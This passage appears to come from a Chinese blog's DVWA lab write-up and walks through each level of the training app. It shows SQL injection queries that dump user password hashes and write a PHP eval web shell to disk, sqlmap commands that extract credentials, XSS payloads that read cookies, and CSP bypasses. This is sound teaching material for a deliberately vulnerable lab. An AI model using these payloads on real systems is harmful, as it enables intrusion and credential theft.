# 爆列名（两种办法，加引号或者十六进制编码） ?id=1' union select 1,group_concat(column_name) from information_schema.columns where table_name =0x7573657273 -- ?id=1' union select 1,group_concat(column_name) from information_schema.columns where table_name ='users' -- -- output：user_id,first_name,last_name,user,password,avatar,last_login,failed_login # 爆字段名 ?id=1' union select group_concat(user_id,first_name,last_name),group_concat(password) from users -- ?id=1' union select null,concat_ws(char(32,58,32),user,password) from users -- ?id=1' union select user,password from users -- -- output：admin/5f4dcc3b5aa765d61d8327deb882cf99 # 读文件 ?id=1' union select 1,load_file('//tmp//key') -- # 写文件() ?id=1' and '1'='2' union select null,'hello' into outfile '/tmp/test01' -- ?id=999' union select null,'hello' into outfile '/tmp/test02' -- ?id=999' union select null,'\u003c?php @evaltest($_POST[\"gg\"]); ?\u003e' into outfile '/tmp/test03' -- ?id=999' union select 1,0x3C3F70687020406576616C28245F504F53545B27636D64275D293B3F3E into outfile '//tmp//test04' -- ","date":"2021-10-13","objectID":"/dvwa/:7:1","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"medium \u003c?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $id = $_POST[ 'id' ]; $id = mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $id); $query = \"SELECT first_name, last_name FROM users WHERE user_id = $id;\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query) or die( '\u003cpre\u003e' . mysqli_error($GLOBALS[\"___mysqli_ston\"]) . '\u003c/pre\u003e' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) { // Display values $first = $row[\"first_name\"]; $last = $row[\"last_name\"]; // Feedback for end user echo \"\u003cpre\u003eID: {$id}\u003cbr /\u003eFirst name: {$first}\u003cbr /\u003eSurname: {$last}\u003c/pre\u003e\"; } } // This is used later on in the index.php page // Setting it here so we can close the database connection in here like in the rest of the source scripts $query = \"SELECT COUNT(*) FROM users;\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '\u003cpre\u003e' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '\u003c/pre\u003e' ); $number_of_rows = mysqli_fetch_row( $result )[0]; mysqli_close($GLOBALS[\"___mysqli_ston\"]); ?\u003e 添加了mysqli_real_escape_string函数对特殊字符进行转义同时内容来自POST请求。转义的字符有： \\\\x00 \\\\n \\\\r \\\\ ' \" \\\\x1a 数字型注入，不用使用上述特殊字符，使用hackbar进行post即可 # 判断注入点 id=1 and 1=1 \u0026Submit=Submit id=1 and 1=2 \u0026Submit=Submit # 爆数据 id=1 union select user,password from users\u0026Submit=Submit ","date":"2021-10-13","objectID":"/dvwa/:7:2","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"high \u003c?php if( isset( $_SESSION [ 'id' ] ) ) { // Get input $id = $_SESSION[ 'id' ]; // Check database $query = \"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '\u003cpre\u003eSomething went wrong.\u003c/pre\u003e' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) { // Get values $first = $row[\"first_name\"]; $last = $row[\"last_name\"]; // Feedback for end user echo \"\u003cpre\u003eID: {$id}\u003cbr /\u003eFirst name: {$first}\u003cbr /\u003eSurname: {$last}\u003c/pre\u003e\"; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); } ?\u003e 添加limit 1限制输出数量，使用注释可以忽略掉 MySQL 注释 # 或 -- （空格）其他与low相同 ","date":"2021-10-13","objectID":"/dvwa/:7:3","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"SQL盲注 用sqlmap做sql盲注 ","date":"2021-10-13","objectID":"/dvwa/:8:0","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"low 没做任何防护 判断注入点 python sqlmap.py -u \"\u003chttp://localhost/vulnerabilities/sqli_blind/?id=1\u0026Submit=Submit#\u003e\" --cookie=\"security=low; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4\" --batch 获取数据库名称 python sqlmap.py -u \"\u003chttp://localhost/vulnerabilities/sqli_blind/?id=1\u0026Submit=Submit#\u003e\" --cookie=\"security=low; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4\" --batch --dbs 获取当前连接的数据库 python sqlmap.py -u \"\u003chttp://localhost/vulnerabilities/sqli_blind/?id=1\u0026Submit=Submit#\u003e\" --cookie=\"security=low; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4\" --batch --current-db 列出数据库中所有用户 python sqlmap.py -u \"\u003chttp://localhost/vulnerabilities/sqli_blind/?id=1\u0026Submit=Submit#\u003e\" --cookie=\"security=low; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4\" --batch --users 获取当前操作的用户 python sqlmap.py -u \"\u003chttp://localhost/vulnerabilities/sqli_blind/?id=1\u0026Submit=Submit#\u003e\" --cookie=\"security=low; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4\" --batch --current-user 列出可连接数据库的所有账户-对应的密码哈希 python sqlmap.py -u \"\u003chttp://localhost/vulnerabilities/sqli_blind/?id=1\u0026Submit=Submit#\u003e\" --cookie=\"security=low; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4\" --batch --passwords 列出数据库中所有的数据表 python sqlmap.py -u \"\u003chttp://localhost/vulnerabilities/sqli_blind/?id=1\u0026Submit=Submit#\u003e\" --cookie=\"security=low; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4\" --batch -D dvwa --tables 列出数据表中所有字段 python sqlmap.py -u \"\u003chttp://localhost/vulnerabilities/sqli_blind/?id=1\u0026Submit=Submit#\u003e\" --cookie=\"security=low; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4\" --batch -D dvwa -T users --columns 导出特定数据表中的字段 python sqlmap.py -u \"\u003chttp://localhost/vulnerabilities/sqli_blind/?id=1\u0026Submit=Submit#\u003e\" --cookie=\"security=low; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4\" --batch -D dvwa -T users -C \"user,password\" --dump ","date":"2021-10-13","objectID":"/dvwa/:8:1","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"medium POST 请求，参数在POST请求体中传递。此时，构造SQLMap操作命令，则需要将url和data分成两部分分别填写，同时需要更新cookie信息的取值。 python sqlmap.py -u \"\u003chttp://localhost/vulnerabilities/sqli_blind/#\u003e\" --data=\"id=1\u0026Submit=Submit\" --cookie=\"security=medium; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4\" --batch -D dvwa -T users -C \"user,password\" --dump ","date":"2021-10-13","objectID":"/dvwa/:8:2","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"high High级别的查询数据提交的页面、查询结果显示的页面是分离成了2个不同的窗口分别控制的。即在查询提交窗口提交数据（POST请求）之后，需要到另外一个窗口进行查看结果（GET请求）。若需获取请求体中的Form Data数据，则需要在提交数据的窗口中查看网络请求数据or通过拦截工具获取。 High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止常规的SQLMap扫描注入测试，因为SQLMap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入；但是并不代表High级别不能用SQLMap进行注入测试，此时需要利用其非常规的命令联合操作，如：--second-order=\"xxxurl\"（设置二阶响应的结果显示页面的url），具体的操作命令可参看==\u003eSQLMap工具使用选项的操作命令\u0026功能 python sqlmap.py --url=\"\u003chttp://localhost/vulnerabilities/sqli_blind/cookie-input.php\u003e\" --data=\"id=1\u0026Submit=Submit\" --second-url=\"\u003chttp://localhost/vulnerabilities/sqli_blind/\u003e\" --cookie=\"id=1; security=high; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4\" --batch ","date":"2021-10-13","objectID":"/dvwa/:8:3","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"weak session ids low: 使用+1的规则生成session medium: 直接使用时间戳生成session high: 使用md5计算session 上述三种都可以用Hackbar和burp来完成session预测 impossible使用随机数+时间戳+固定字符串（“Impossible”）进行 sha1 运算，作为 session Id。 ","date":"2021-10-13","objectID":"/dvwa/:9:0","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"XSS(DOM) ","date":"2021-10-13","objectID":"/dvwa/:10:0","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"DOM树 HTML 文档的主干是标签（tag）。 根据文档对象模型（DOM），每个 HTML 标签都是一个对象。嵌套的标签是闭合标签的“子标签（children）”。标签内的文本也是一个对象。 所有这些对象都可以通过 JavaScript 来访问，我们可以使用它们来修改页面。 例如，document.body 是表示 \u003cbody\u003e 标签的对象。 HTML DOM 是关于如何获取、修改、添加或删除 HTML 元素的标准 简单来说DOM主要研究的是节点，所有节点可通过javascript访问(增，删，改，查) 对于DOM型的XSS是一种基于DOM树的一种代码注入攻击方式，可以是反射型的，也可以是存储型的 最大的特点就是不与后台服务器交互，只是通过浏览器的DOM树解析产生 可能触发DOM型XSS属性： document.write属性 document.referer属性 innerHTML属性 windows.name属性 location属性 ","date":"2021-10-13","objectID":"/dvwa/:10:1","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"low 没有任何防护 if (document.location.href.indexOf(\"default=\") \u003e= 0) { var lang = document.location.href.substring(document.location.href.indexOf(\"default=\")+8); # 函数截取url中指定参数后面的内容 document.write(\"\u003coption value='\" + lang + \"'\u003e\" + decodeURI(lang) + \"\u003c/option\u003e\"); # 将HTML表达式或JavaScript代码 document.write(\"\u003coption value='' disabled='disabled'\u003e----\u003c/option\u003e\"); } document.write(\"\u003coption value='English'\u003eEnglish\u003c/option\u003e\"); document.write(\"\u003coption value='French'\u003eFrench\u003c/option\u003e\"); document.write(\"\u003coption value='Spanish'\u003eSpanish\u003c/option\u003e\"); document.write(\"\u003coption value='German'\u003eGerman\u003c/option\u003e\"); 将标签写成如下形式： \u003chttp://localhost/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(document.cookie)%3C/script%3E\u003e 即可完成弹框。 ","date":"2021-10-13","objectID":"/dvwa/:10:2","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"medium \u003c?php // Is there any input? if ( array_key_exists( \"default\", $_GET ) \u0026\u0026 !is_null ($_GET[ 'default' ]) ) { $default = $_GET['default']; # Do not allow script tags if (stripos ($default, \"\u003cscript\") !== false) { header (\"location: ?default=English\"); exit; } } ?\u003e 不允许\u003cscript\u003e标签。可以选择其他标签：\u003cimg src=1 onerror=alert(1)\u003e 但是直接写在default后面解析会有问题: \u003coption\u003e标签里面没有值了。可以选择先闭合option标签，再闭合select标签。 \u003c/option\u003e\u003c/select\u003e\u003cimg src=1 onerror=alert(document.cookie)\u003e 或者直接闭合select \u003c/select\u003e\u003cimg src=1 onerror=alert(document.cookie)\u003e ","date":"2021-10-13","objectID":"/dvwa/:10:3","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"high \u003c?php // Is there any input? if ( array_key_exists( \"default\", $_GET ) \u0026\u0026 !is_null ($_GET[ 'default' ]) ) { # White list the allowable languages switch ($_GET['default']) { case \"French\": case \"English\": case \"German\": case \"Spanish\": # ok break; default: header (\"location: ?default=English\"); exit; } } ?\u003e URL中#号之后的内容，不会被提交到服务器，可以直接与浏览器进行交互 在正常url后输入：#\u003cscript\u003ealert(document.cookie)\u003c/script\u003e即可。 ","date":"2021-10-13","objectID":"/dvwa/:10:4","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"XSS Reflect ","date":"2021-10-13","objectID":"/dvwa/:11:0","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"low 没做过滤\u003cscript\u003ealert(1)\u003c/script\u003e ","date":"2021-10-13","objectID":"/dvwa/:11:1","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"medium \u003c?php header (\"X-XSS-Protection: 0\"); // Is there any input? if( array_key_exists( \"name\", $_GET ) \u0026\u0026 $_GET[ 'name' ] != NULL ) { // Get input $name = str_replace( '\u003cscript\u003e', '', $_GET[ 'name' ] ); // Feedback for end user echo \"\u003cpre\u003eHello ${name}\u003c/pre\u003e\"; } ?\u003e 对\u003cscript\u003e进行了过滤，有三种绕过方式 使用双写绕过，\u003cscr\u003cscript\u003eipt\u003ealert(1)\u003c/script\u003e 使用大小写绕过sCript\u003ealert(1)\u003c/script\u003e 使用其他标签。\u003cimg src=1 onerror=alert(1)\u003e ","date":"2021-10-13","objectID":"/dvwa/:11:2","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"high \u003c?php header (\"X-XSS-Protection: 0\"); // Is there any input? if( array_key_exists( \"name\", $_GET ) \u0026\u0026 $_GET[ 'name' ] != NULL ) { // Get input $name = preg_replace( '/\u003c(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); // Feedback for end user echo \"\u003cpre\u003eHello ${name}\u003c/pre\u003e\"; } ?\u003e 正则匹配绕过\u003cscript\u003e，可以用img标签。 ","date":"2021-10-13","objectID":"/dvwa/:11:3","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"XSS Stored ","date":"2021-10-13","objectID":"/dvwa/:12:0","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"low \u003c?php if( isset( $_POST[ 'btnSign' ] ) ) { // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[\"___mysqli_ston\"]) \u0026\u0026 is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $message ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Sanitize name input $name = ((isset($GLOBALS[\"___mysqli_ston\"]) \u0026\u0026 is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $name ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '\u003cpre\u003e' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '\u003c/pre\u003e' ); //mysql_close(); } ?\u003e isset()函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false trim()函数作用为移除字符串两侧空白字符或其他预定义字符 stripslashes()函数用于删除字符串中的反斜杠 mysqli_real_escape_string()`函数会对字符串中的特殊符号`(\\\\x00，\\\\n，\\\\r，\\\\，'，\"，\\\\x1a) 进行转义。 在代码中对message，name输入框内容没有进行XSS方面的过滤和检查。且通过query语句插入到数据库中。所以存在存储型XSS漏洞。 medium, high和上面反射类型的绕过方式相同 ","date":"2021-10-13","objectID":"/dvwa/:12:1","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"CSP bypass CSP：浏览器的安全策略，如果标签，或者是服务器中返回 HTTP 头中有 Content-Security-Policy 标签 ，浏览器会根据标签里面的内容，判断哪些资源可以加载或执行 ","date":"2021-10-13","objectID":"/dvwa/:13:0","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"low \u003c?php $headerCSP = \"Content-Security-Policy: script-src 'self' \u003chttps://pastebin.com\u003e example.com code.jquery.com \u003chttps://ssl.google-analytics.com\u003e ;\"; // allows js from self, pastebin.com, jquery and google analytics. header($headerCSP); # \u003chttps://pastebin.com/raw/R570EE00\u003e ?\u003e\u003c?php if (isset ($_POST['include'])) { $page[ 'body' ] .= \" \u003cscript src='\" . $_POST['include'] . \"'\u003e\u003c/script\u003e \"; } $page[ 'body' ] .= ' \u003cform name=\"csp\" method=\"POST\"\u003e \u003cp\u003eYou can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:\u003c/p\u003e \u003cinput size=\"50\" type=\"text\" name=\"include\" value=\"\" id=\"include\" /\u003e \u003cinput type=\"submit\" value=\"Include\" /\u003e \u003c/form\u003e '; 直接上pastebin网站写一个js的代码写进入即可 ","date":"2021-10-13","objectID":"/dvwa/:13:1","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"medium \u003c?php $headerCSP = \"Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';\"; header($headerCSP); // Disable XSS protections so that inline alert boxes will work header (\"X-XSS-Protection: 0\"); ?\u003e\u003c?php if (isset ($_POST['include'])) { $page[ 'body' ] .= \" \" . $_POST['include'] . \" \"; } $page[ 'body' ] .= ' \u003cform name=\"csp\" method=\"POST\"\u003e \u003cp\u003eWhatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.\u003c/p\u003e \u003cinput size=\"50\" type=\"text\" name=\"include\" value=\"\" id=\"include\" /\u003e \u003cinput type=\"submit\" value=\"Include\" /\u003e \u003c/form\u003e '; http头信息中的script-src的合法来源发生了变化，说明如下 unsafe-inline，允许使用内联资源，如内联\u003c script\u003e元素，javascript:URL，内联事件处理程序（如onclick）和内联\u003c style\u003e元素。必须包括单引号。 nonce-source，仅允许特定的内联脚本。nonce=“TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA” \u003cscript nonce=\"TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=\"\u003ealert(1)\u003c/script\u003e ","date":"2021-10-13","objectID":"/dvwa/:13:2","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"high \u003c?php $headerCSP = \"Content-Security-Policy: script-src 'self';\"; header($headerCSP); ?\u003e\u003c?php if (isset ($_POST['include'])) { $page[ 'body' ] .= \" \" . $_POST['include'] . \" \"; } $page[ 'body' ] .= ' \u003cform name=\"csp\" method=\"POST\"\u003e \u003cp\u003eThe page makes a call to ' . DVWA_WEB_PAGE_TO_ROOT . '/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.\u003c/p\u003e \u003cp\u003e1+2+3+4+5=\u003cspan id=\"answer\"\u003e\u003c/span\u003e\u003c/p\u003e \u003cinput type=\"button\" id=\"solve\" value=\"Solve the sum\" /\u003e \u003c/form\u003e \u003cscript src=\"source/high.js\"\u003e\u003c/script\u003e '; function clickButton() { var s = document.createElement(\"script\"); s.src = \"source/jsonp.php?callback=solveSum\"; document.body.appendChild(s); } function solveSum(obj) { if (\"answer\" in obj) { document.getElementById(\"answer\").innerHTML = obj['answer']; } } var solve_button = document.getElementById (\"solve\"); if (solve_button) { solve_button.addEventListener(\"click\", function() { clickButton(); }); } CSP头中只有script-src 'self'说明只允许本节面加载的js执行。js逻辑： 点击按钮 -\u003e js 生成一个 script 标签(src 指向 source/jsonp.php?callback=solveNum), 并把它加入到 DOM 中 -\u003e js 中定义了一个 solveNum 的函数 -\u003e 因此 script 标签会把远程加载的solveSum({\"answer\":\"15\"})当作js代码执行。 但是服务端的代码中，可以接收include传入的参数。 callback 参数可以被操控以生成任何你想要得到的结果, 比如 alert, 因此可以构造 Payload: \u003cscript src=\"source/jsonp.php?callback=alert('hacked');\"\u003e\u003c/script\u003e 把这个当做 include 参数传给界面就注入成功 ","date":"2021-10-13","objectID":"/dvwa/:13:3","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"JavaScript ","date":"2021-10-13","objectID":"/dvwa/:14:0","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"low \u003c?php $page[ 'body' ] .= \u003c\u003c\u003cEOF \u003cscript\u003e /* MD5 code from here \u003chttps://github.com/blueimp/JavaScript-MD5\u003e */ !function(n){\"use strict\";function t(n,t){var r=(65535\u0026n)+(65535\u0026t);return(n\u003e\u003e16)+(t\u003e\u003e16)+(r\u003e\u003e16)\u003c\u003c16|65535\u0026r}function r(n,t){return n\u003c\u003ct|n\u003e\u003e\u003e32-t}function e(n,e,o,u,c,f){return t(r(t(t(e,n),t(u,f)),c),o)}function o(n,t,r,o,u,c,f){return e(t\u0026r|~t\u0026o,n,t,u,c,f)}function u(n,t,r,o,u,c,f){return e(t\u0026o|r\u0026~o,n,t,u,c,f)}function c(n,t,r,o,u,c,f){return e(t^r^o,n,t,u,c,f)}function f(n,t,r,o,u,c,f){return e(r^(t|~o),n,t,u,c,f)}function i(n,r){n[r\u003e\u003e5]|=128\u003c\u003cr%32,n[14+(r+64\u003e\u003e\u003e9\u003c\u003c4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e\u003cn.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]}function a(n){var t,r=\"\",e=32*n.length;for(t=0;t\u003ce;t+=8)r+=String.fromCharCode(n[t\u003e\u003e5]\u003e\u003e\u003et%32\u0026255);return r}function d(n){var t,r=[];for(r[(n.length\u003e\u003e2)-1]=void 0,t=0;t\u003cr.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t\u003ce;t+=8)r[t\u003e\u003e5]|=(255\u0026n.charCodeAt(t/8))\u003c\u003ct%32;return r}function h(n){return a(i(d(n),8*n.length))}function l(n,t){var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length\u003e16\u0026\u0026(o=i(o,8*n.length)),r=0;r\u003c16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))}function g(n){var t,r,e=\"\";for(r=0;r\u003cn.length;r+=1)t=n.charCodeAt(r),e+=\"0123456789abcdef\".charAt(t\u003e\u003e\u003e4\u002615)+\"0123456789abcdef\".charAt(15\u0026t);return e}function v(n){return unescape(encodeURIComponent(n))}function m(n){return h(v(n))}function p(n){return g(m(n))}function s(n,t){return l(v(n),v(t))}function C(n,t){return g(s(n,t))}function A(n,t,r){return t?r?s(t,n):C(t,n):r?m(n):p(n)}\"function\"==typeof define\u0026\u0026define.amd?define(function(){return A}):\"object\"==typeof module\u0026\u0026module.exports?module.exports=A:n.md5=A}(this); function rot13(inp) { return inp.replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c\u003c=\"Z\"?90:122)\u003e=(c=c.charCodeAt(0)+13)?c:c-26);}); } function ","date":"2021-10-13","objectID":"/dvwa/:14:1","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"medium \u003c?php $page[ 'body' ] .= \u003c\u003c\u003cEOF \u003cscript src=\"/vulnerabilities/javascript/source/medium.js\"\u003e\u003c/script\u003e EOF; ?\u003efunction do_something(e){ for(var t=\"\",n=e.length-1;n\u003e=0;n--) t+=e[n]; return t } setTimeout(function(){do_elsesomething(\"XX\")},300); function do_elsesomething(e) { document.getElementById(\"token\").value=do_something(e+document.getElementById(\"phrase\").value+\"XX\") } 将phrase变量的值逆序，也就是sseccus;生成的token值XXsseccusXX ","date":"2021-10-13","objectID":"/dvwa/:14:2","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"high var a=['fromCharCode','toString','replace','BeJ','\\\\x5cw+','Lyg','SuR','(w(){\\\\x273M\\\\x203L\\\\x27;q\\\\x201l=\\\\x273K\\\\x203I\\\\x203J\\\\x20T\\\\x27;q\\\\x201R=1c\\\\x202I===\\\\x271n\\\\x27;q\\\\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\\\\x202L=!1R\u0026\u00261c\\\\x202M===\\\\x271n\\\\x27;q\\\\x202o=!Y.2S\u0026\u00261c\\\\x202d===\\\\x271n\\\\x27\u0026\u00262d.2Q\u0026\u00262d.2Q.3S;p(2o){Y=3R}z\\\\x20p(2L){Y=2M}q\\\\x202G=!Y.3Q\u0026\u00261c\\\\x202g===\\\\x271n\\\\x27\u0026\u00262g.X;q\\\\x202s=1c\\\\x202l===\\\\x27w\\\\x27\u0026\u00262l.3P;q\\\\x201y=!Y.3H\u0026\u00261c\\\\x20Z!==\\\\x272T\\\\x27;q\\\\x20m=\\\\x273G\\\\x27.3z(\\\\x27\\\\x27);q\\\\x202w=[-3y,3x,3v,3w];q\\\\x20U=[24,16,8,0];q\\\\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\\\\x201E=[\\\\x271e\\\\x27,\\\\x2727\\\\x27,\\\\x271G\\\\x27,\\\\x272R\\\\x27];q\\\\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\\\\x204C.Q.2U.1I(1x)===\\\\x27[1n\\\\x201z]\\\\x27}}p(1y\u0026\u0026(Y.50||!Z.1N)){Z.1N=w(1x){A\\\\x201c\\\\x201x===\\\\x271n\\\\x27\u0026\u00261x.1w\u0026\u00261x.1w.1J===Z}}q\\\\x202m=w(1X,x){A\\\\x20w(s){A\\\\x20O\\\\x20N(x,1d).S(s)[1X]()}};q\\\\x202a=w(x){q\\\\x20P=2m(\\\\x271e\\\\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\\\\x20O\\\\x20N(x)};P.S=w(s){A\\\\x20P.1T().S(s)};1g(q\\\\x20i=0;i\u003c1E.W;++i){q\\\\x20T=1E[i];P[T]=2m(T,x)}A\\\\x20P};q\\\\x202P=w(P,x){q\\\\x201S=2O(\\\\x222N(\\\\x271S\\\\x27)\\\\x22);q\\\\x201Y=2O(\\\\x222N(\\\\x271w\\\\x27).1Y\\\\x22);q\\\\x202n=x?\\\\x271H\\\\x27:\\\\x271q\\\\x27;q\\\\x202z=w(s){p(1c\\\\x20s===\\\\x272p\\\\x27){A\\\\x201S.2x(2n).S(s,\\\\x274